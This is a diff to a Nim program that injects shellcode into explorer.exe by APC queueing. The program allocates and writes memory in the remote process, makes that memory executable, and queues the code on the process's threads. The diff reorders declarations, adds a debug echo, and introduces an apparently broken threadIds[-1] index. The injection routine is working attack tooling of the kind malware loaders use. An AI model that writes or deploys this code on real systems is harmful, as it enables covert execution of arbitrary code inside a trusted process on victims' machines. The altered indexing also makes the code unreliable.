@@ -11,23 +11,18 @@ proc toString(chars: openArray[WCHAR]): string =
         result.add(cast[char](c))
 
 proc apcQueue[byte](shellcode: openArray[byte]): void =
-  var
-    entry: PROCESSENTRY32
-    threadEntry: THREADENTRY32
-    hSnapshot: HANDLE
-    bytesWritten: SIZE_T
-    processEntry: PROCESSENTRY32
-    threadIds: seq[int] = @[]   
-    op: DWORD = 0
 
 
+  var entry: PROCESSENTRY32
   entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+  var threadEntry: THREADENTRY32
   threadEntry.dwSize = cast[DWORD](sizeof(THREADENTRY32))
-  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
-  defer: CloseHandle(hSnapshot)
+  var hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS or TH32CS_SNAPTHREAD, 0)
+  var targetHandle = hSnapshot
+  defer: CloseHandle(targetHandle)
 
   let processName = r"explorer.exe"
-
+  var processEntry: PROCESSENTRY32
   if Process32First(hSnapshot, addr entry):
     while Process32Next(hSnapshot, addr entry):
       if entry.szExeFile.toString == processName:
@@ -37,18 +32,22 @@ proc apcQueue[byte](shellcode: openArray[byte]): void =
   let rPtr = VirtualAllocEx(pHandle, nil, cast[DWORD](shellcode.len), MEM_COMMIT, PAGE_READWRITE)
   let apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr)
 
+  var bytesWritten: SIZE_T
   WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
+
+  var op: DWORD
   VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr op)
 
+  var threadIds: seq[int] = @[]   
   if Thread32First(hSnapshot, addr threadEntry):
     while Thread32Next(hSnapshot, addr threadEntry):
       if threadEntry.th32OwnerProcessID == processEntry.th32ProcessID:
         threadIds.add(threadEntry.th32ThreadID)
   
+  echo threadIds.len 
   for threadId in threadIds:
-    let tHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, cast[DWORD](threadId))
+    let tHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, cast[DWORD](threadIds[-1]))
     QueueUserAPC(cast[PAPCFUNC](apcRoutine), tHandle, cast[ULONG_PTR](nil))
-    Sleep(1000 * 2)  
  
   
 when isMainModule:
